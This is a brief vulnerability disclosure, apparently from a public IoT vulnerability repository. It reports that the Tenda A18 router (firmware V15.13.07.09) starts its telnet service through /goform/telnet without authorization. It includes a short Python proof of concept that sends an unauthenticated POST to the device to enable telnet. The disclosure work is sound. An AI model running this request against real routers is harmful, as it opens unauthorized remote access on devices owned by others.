# Tenda A18 V15.13.07.09 Unauthorized opening of tenlet service

## Firmware information

- Manufacturer's address: https://www.tenda.com.cn/

- Firmware download address: https://www.tenda.com.cn/download/detail-2760.html

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/A18/formWifiBasicSet/img/1.png)

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/A18/TendaTelnet/img/2.png)


In /goform/telnet, the tenlet service can be started without authorization

## Poc

```python
import requests

url = "http://192.168.10.104/goform/telnet"

r = requests.post(url)

print(r.content)
```

You can see that the tenlet service is enabled
